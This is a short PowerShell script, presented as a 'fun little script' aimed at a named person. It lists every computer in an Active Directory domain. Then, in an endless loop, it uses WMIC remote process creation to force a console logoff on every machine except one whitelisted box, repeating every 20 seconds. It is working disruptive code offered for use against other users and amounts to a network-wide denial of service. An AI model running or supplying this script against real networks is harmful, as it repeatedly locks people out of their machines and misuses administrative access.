#fun little script to log user off, for scr1ptc@t

$computers = dsquery * -filter "(objectclass=computer)" -attr samaccountname -limit 0
$computers = $computers[1..($computers.length-1)]

$whitelist=@("your current box")

while ($true) {
	foreach ($c in $computers){
		$c = $c.trim().trim("$");
		if ($c -notin $whitelist){
			write-host $c;
			wmic /node:$c process call create "logoff console";
			start-sleep 1
        }
    }
    start-sleep 20
}
